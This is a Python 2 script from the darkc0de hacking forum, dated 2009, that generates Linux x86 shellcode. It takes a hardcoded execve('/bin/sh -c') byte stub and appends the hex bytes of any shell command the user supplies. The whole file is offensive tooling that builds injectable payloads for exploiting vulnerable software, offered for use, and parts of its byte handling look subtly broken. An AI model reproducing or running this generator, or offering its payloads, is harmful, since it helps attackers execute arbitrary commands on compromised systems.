#!/usr/bin/python
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################ 
#Greetz to all darkc0de and Zone-Hacker member
#Shoutz to d3hydr8,lowlz,p47r1ck,r45c4l,smith,dalsim,baltazar
#Original Idea took from Milw0rm (Thanks Str0ke)
import sys,os,string

if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = 'clear'
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'

os.system(SysCls)
print "\n|---------------------------------------------------------------|"
print "| beenudel1986[@]gmail[dot]com                                  |"
print "| Command Execution Shell Generator(linux)                      |"
print "|   17/2009      shellgen.py                                    |"
print "|   Do Visit     www.BeenuArora.com      &        darkc0de.com  |"
print "|   Generates Shell Code for system Commands                    |"
print "|---------------------------------------------------------------|\n"

if len(sys.argv) < 2: 
	print "\nUsage: ./shellgen.py <command>" 
	print "Ex: ./shellgen.py ls\n" 
	sys.exit(1)

command=sys.argv[1]
code ="\\x60\\x31\\xc0\\x31\\xd2\\xb0\\x0b\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\x52\\x68\\x2d\\x63\\x63\\x63 \\x89\\xe1\\x52\\xeb\\x07\\x51\\x53\\x89\\xe1\\xcd\\x80\\x61\\xe8\\xf4\\xff\\xff\\xff" 
for payload in command:
	hexshell=hex( ord(payload))
	attachshell="\\"+hexshell[1:]
	code+=attachshell

print "\n Generated Shell. \n"
print code

